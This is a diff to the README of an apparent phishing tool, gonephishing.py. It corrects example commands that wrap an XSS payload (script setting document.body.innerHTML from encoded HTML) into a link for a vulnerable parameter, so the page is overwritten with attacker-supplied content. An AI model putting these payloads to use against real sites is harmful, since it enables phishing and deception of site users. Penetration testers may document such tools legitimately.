@@ -26,13 +26,13 @@ pip3 install htmlmin
 
 Create a file called test.html (the @ sign below signifies that you are using a file rather than direct input)
 ~~~
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders --encoders b64
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders b64
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("¬")</script>'  --encoders --encoders hex
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("¬")</script>'   --encoders hex
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders --encoders b64,hex
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'   --encoders b64,hex
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders --encoders pcnt
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML="¬"</script>'  --encoders pcnt
 ~~~
 Paste the generated link into the vulnerable request parameter and the page should be overwritten with the supplied html.
 
